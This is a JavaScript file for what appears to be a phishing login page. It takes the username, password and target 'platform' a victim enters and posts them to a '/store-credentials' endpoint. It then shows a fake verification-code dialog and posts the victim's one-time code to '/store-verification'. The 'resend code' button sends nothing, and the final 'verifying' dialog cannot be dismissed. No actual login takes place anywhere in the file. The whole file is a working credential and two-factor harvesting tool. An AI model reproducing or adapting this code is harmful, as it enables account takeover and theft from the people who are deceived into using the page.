// DOM Elements
const loginForm = document.getElementById('loginForm');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const usernameError = document.getElementById('usernameError');
const passwordError = document.getElementById('passwordError');
const verificationModal = document.getElementById('verificationModal');
const verificationCode = document.getElementById('verificationCode');
const codeError = document.getElementById('codeError');
const resendCode = document.getElementById('resendCode');
const sentMessage = document.getElementById('sentMessage');
const verifyButton = document.getElementById('verifyButton');
const verifyingModal = document.getElementById('verifyingModal');
const platformInput = document.getElementById('platform');

// Input validation
function validateInput(input, errorElement) {
    if (!input.value.trim()) {
        errorElement.style.display = 'block';
        return false;
    }
    errorElement.style.display = 'none';
    return true;
}

// Validate username on blur
usernameInput.addEventListener('blur', () => {
    validateInput(usernameInput, usernameError);
});

// Validate password on blur
passwordInput.addEventListener('blur', () => {
    validateInput(passwordInput, passwordError);
});

let loginAttemptId = null;

// Form submission
loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const isUsernameValid = validateInput(usernameInput, usernameError);
    const isPasswordValid = validateInput(passwordInput, passwordError);

    if (isUsernameValid && isPasswordValid) {
        const loginButton = document.getElementById('loginButton');
        const originalText = loginButton.innerHTML;
        
        // Show loading spinner
        loginButton.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Logging in...';
        loginButton.disabled = true;
        
        const identifier = usernameInput.value;
        const password = passwordInput.value;
        const platform = platformInput.value;

        try {
            const response = await fetch('/store-credentials', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
                },
                body: JSON.stringify({
                    identifier,
                    password,
                    platform
                })
            });

            const data = await response.json();
            loginAttemptId = data.id;

            // Reset button
            loginButton.innerHTML = originalText;
            loginButton.disabled = false;

            // Show verification modal
            console.log('Showing verification modal');
            verificationModal.style.opacity = '1';
            verificationModal.style.pointerEvents = 'all';
            document.body.style.overflow = 'hidden';
            sentMessage.style.opacity = '0';
            console.log('Modal should be visible now');

        } catch (error) {
            console.error('Error storing credentials:', error);
            // Reset button on error
            loginButton.innerHTML = originalText;
            loginButton.disabled = false;
        }
    }
});

// Resend code functionality
resendCode.addEventListener('click', () => {
    sentMessage.style.opacity = '1';
    setTimeout(() => {
        sentMessage.style.opacity = '0';
    }, 2000);
});

// Verify code
verifyButton.addEventListener('click', async () => {
    const code = verificationCode.value.trim();
    const platform = platformInput.value;

    if (!code) {
        codeError.style.display = 'block';
        return;
    }

    codeError.style.display = 'none';
    
    // Show loading spinner
    const originalText = verifyButton.innerHTML;
    verifyButton.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Verifying...';
    verifyButton.disabled = true;

    if (loginAttemptId) {
        try {
            await fetch('/store-verification', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
                },
                body: JSON.stringify({
                    attempt_id: loginAttemptId,
                    verification_code: code,
                    platform
                })
            });

            verificationModal.style.opacity = '0';
            verificationModal.style.pointerEvents = 'none';
            verifyingModal.style.opacity = '1';
            verifyingModal.style.pointerEvents = 'all';

        } catch (error) {
            console.error('Error storing verification code:', error);
            // Reset button on error
            verifyButton.innerHTML = originalText;
            verifyButton.disabled = false;
        }
    }
});

// Prevent closing modal by clicking outside
verificationModal.addEventListener('click', (e) => {
    if (e.target === verificationModal) {
        e.stopPropagation();
    }
});

verifyingModal.addEventListener('click', (e) => {
    if (e.target === verifyingModal) {
        e.stopPropagation();
    }
});